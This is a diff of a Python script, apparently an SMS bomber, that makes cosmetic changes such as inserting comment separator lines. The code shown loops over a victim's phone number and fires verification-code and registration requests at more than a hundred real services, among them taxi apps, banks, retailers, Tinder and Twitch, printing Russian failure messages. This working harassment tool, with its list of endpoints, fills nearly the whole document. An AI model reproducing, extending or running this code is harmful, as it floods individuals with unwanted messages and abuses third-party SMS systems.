@@ -1,4 +1,4 @@
-from colorama import * 
+from colorama import *
 import requests
 import threading
 from threading import Timer, Thread
@@ -103,6 +103,7 @@ class cloop(object):
         for kolvo in range(kolvos):
             kolvo = int(kolvo)
             standar_headers = {"User-Agent": ua}
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://p.grabtaxi.com/api/passenger/v2/profiles/register",
@@ -124,7 +125,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone}
@@ -136,7 +137,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://lenta.com/api/v1/authentication/requestValidationCode",
@@ -149,7 +150,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://dostavista.ru/backend/send-verification-sms",
@@ -162,7 +163,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://moscow.rutaxi.ru/ajax_keycode.html", data={"l": _phone9}
@@ -174,7 +175,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://belkacar.ru/get-confirmation-code",
@@ -188,7 +189,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://secure.online.ua/ajax/check_phone/",
@@ -201,7 +202,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://cabinet.planetakino.ua/service/sms",
@@ -214,7 +215,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
@@ -227,7 +228,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.ivi.ru/mobileapi/user/register/phone/v6",
@@ -240,7 +241,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.get(
                     "https://www.finam.ru/api/smslocker/sendcode",
@@ -253,7 +254,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.mtstv.ru/v1/users", json={"msisdn": _phone}, headers={}
@@ -265,7 +266,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://account.my.games/signup_send_sms/", data={"phone": _phone}
@@ -277,7 +278,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post("https://kasta.ua/api/v2/login/", data={"phone": _phone})
                 kk = kk + 1
@@ -287,7 +288,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
@@ -300,7 +301,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://city24.ua/personalaccount/account/registration",
@@ -313,7 +314,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://client-api.sushi-master.ru/api/v1/auth/init",
@@ -326,7 +327,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post("https://auth.multiplex.ua/login", json={"login": _phone})
                 kk = kk + 1
@@ -336,7 +337,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone}
@@ -348,7 +349,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.get(
                     "https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32",
@@ -361,7 +362,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://koronapay.com/transfers/online/api/users/otps",
@@ -374,7 +375,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://btfair.site/api/user/phone/code",
@@ -387,7 +388,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://thehive.pro/auth/signup", json={"phone": "+" + _phone,}
@@ -399,7 +400,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
@@ -413,7 +414,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://app.karusel.ru/api/v1/phone/",
@@ -427,7 +428,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.tinkoff.ru/v1/sign_up",
@@ -441,7 +442,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.mtstv.ru/v1/users", json={"msisdn": _phone}, headers={}
@@ -453,7 +454,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://youla.ru/web-api/auth/request_code", data={"phone": _phone}
@@ -465,7 +466,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://pizzahut.ru/account/password-reset",
@@ -483,7 +484,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.rabota.ru/remind", data={"credential": _phone}
@@ -495,7 +496,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://rutube.ru/api/accounts/sendpass/phone",
@@ -508,7 +509,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.citilink.ru/registration/confirm/phone/+"
@@ -522,7 +523,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php",
@@ -535,7 +536,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.get(
                     "https://www.oyorooms.com/api/pwa/generateotp?phone="
@@ -549,7 +550,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp",
@@ -574,7 +575,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://newnext.ru/graphql",
@@ -600,7 +601,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.sunlight.net/v3/customers/authorization/",
@@ -613,7 +614,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",
@@ -631,7 +632,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://lk.invitro.ru/lk2/lka/patient/refreshCode",
@@ -644,7 +645,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://online.sbis.ru/reg/service/",
@@ -663,7 +664,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://ib.psbank.ru/api/authentication/extendedClientAuthRequest",
@@ -688,7 +689,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",
@@ -701,7 +702,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://app.karusel.ru/api/v1/phone/", data={"phone": _phone}
@@ -713,7 +714,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
@@ -726,7 +727,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.carsmile.com/",
@@ -743,7 +744,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.citilink.ru/registration/confirm/phone/+"
@@ -757,7 +758,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.delitime.ru/api/v2/signup",
@@ -770,7 +771,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.get(
                     "https://findclone.ru/register", params={"phone": "+" + _phone}
@@ -782,7 +783,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.icq.com/smsreg/requestPhoneValidation.php",
@@ -802,7 +803,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -824,7 +825,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -841,7 +842,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
@@ -854,7 +855,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.ivi.ru/mobileapi/user/register/phone/v6",
@@ -867,7 +868,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://cloud.mail.ru/api/v2/notify/applink",
@@ -885,7 +886,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
@@ -903,7 +904,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
@@ -916,7 +917,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post("https://plink.tech/register/", json={"phone": _phone})
                 kk = kk + 1
@@ -926,7 +927,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
@@ -939,7 +940,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
                 kk = kk + 1
@@ -949,7 +950,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
@@ -962,7 +963,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://passport.twitch.tv/register?trusted_request=true",
@@ -982,7 +983,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://cabinet.wi-fi.ru/api/auth/by-sms",
@@ -996,7 +997,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.wowworks.ru/v2/site/send-code",
@@ -1009,7 +1010,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://eda.yandex/api/v1/user/request_authentication_code",
@@ -1022,7 +1023,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://youla.ru/web-api/auth/request_code", data={"phone": _phone}
@@ -1034,7 +1035,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",
@@ -1052,7 +1053,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
@@ -1065,7 +1066,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.delivery-club.ru/ajax/user_otp", data={"phone": _phone}
@@ -1077,7 +1078,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
@@ -1092,7 +1093,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.flipkart.com/api/5/user/otp/generate",
@@ -1109,7 +1110,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.flipkart.com/api/6/user/signup/status",
@@ -1126,7 +1127,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://lk.invitro.ru/lk2/lka/patient/refreshCode",
@@ -1139,7 +1140,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://online.sbis.ru/reg/service/",
@@ -1158,7 +1159,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://moscow.rutaxi.ru/ajax_keycode.html", data={"l": _phone9}
@@ -1170,7 +1171,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://my.citrus.ua/api/v2/register",
@@ -1189,7 +1190,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://my.citrus.ua/api/auth/login", {"identity": _phoneCitrus}
@@ -1201,7 +1202,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://my.modulbank.ru/api/v2/registration/nameAndPhone",
@@ -1218,7 +1219,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.moyo.ua/identity/registration",
@@ -1231,7 +1232,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://comfy.ua/ua/customer/account/createPost",
@@ -1248,7 +1249,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12",
@@ -1261,7 +1262,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://cinema5.ru/api/phone_code", data={"phone": _phonePizzahut}
@@ -1273,7 +1274,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.etm.ru/cat/runprog.html",
@@ -1291,7 +1292,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://apteka.ru/_action/auth/getForm/",
@@ -1316,7 +1317,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
@@ -1329,7 +1330,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://secunda.com.ua/personalarea/registrationvalidphone",
@@ -1342,7 +1343,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "http://api.rozamira-azs.ru/v1/auth", data={"login": _phone,}
@@ -1354,7 +1355,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
@@ -1367,7 +1368,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.get(
                     "https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",
@@ -1380,7 +1381,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.iconjob.co/api/auth/verification_code",
@@ -1393,7 +1394,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://panda99.ru/bdhandlers/order.php?t={int(time())}",
@@ -1406,7 +1407,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://auth.pizza33.ua/ua/join/check/",
@@ -1428,7 +1429,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone}
@@ -1440,7 +1441,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://zoloto585.ru/api/bcard/reg/",
@@ -1462,7 +1463,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
@@ -1475,7 +1476,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12",
@@ -1488,7 +1489,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
@@ -1496,7 +1497,7 @@ class cloop(object):
                 )
             except:
                 pass
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
@@ -1509,7 +1510,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.flipkart.com/api/5/user/otp/generate",
@@ -1526,7 +1527,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.flipkart.com/api/6/user/signup/status",
@@ -1543,7 +1544,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://bamper.by/registration/?step=1",
@@ -1560,7 +1561,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://friendsclub.ru/assets/components/pl/connector.php",
@@ -1573,7 +1574,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29",
@@ -1586,7 +1587,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://app.doma.uchi.ru/api/v1/parent/signup_start",
@@ -1604,7 +1605,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://app.doma.uchi.ru/api/v1/parent/signup_start",
@@ -1622,7 +1623,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.icq.com/smsreg/requestPhoneValidation.php",
@@ -1642,7 +1643,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://shafa.ua/api/v3/graphiql",
@@ -1659,7 +1660,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",
@@ -1678,7 +1679,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://uklon.com.ua/api/v1/account/code/send",
@@ -1692,7 +1693,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://crm.getmancar.com.ua/api/veryfyaccount",
@@ -1710,7 +1711,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post("https://auth.multiplex.ua/login", json={"login": _phone})
                 kk = kk + 1
@@ -1720,6 +1721,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -1736,7 +1738,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://secure.ubki.ua/b2_api_xml/ubki/auth",
@@ -1761,7 +1763,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.top-shop.ru/login/loginByPhone/",
@@ -1774,7 +1776,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",
@@ -1787,7 +1789,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://osava.ua/users/sign-up/callbacks",
@@ -1800,7 +1802,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://eda.yandex/api/v1/user/request_authentication_code",
@@ -1813,7 +1815,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://izi.ua/api/auth/register",
@@ -1830,7 +1832,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
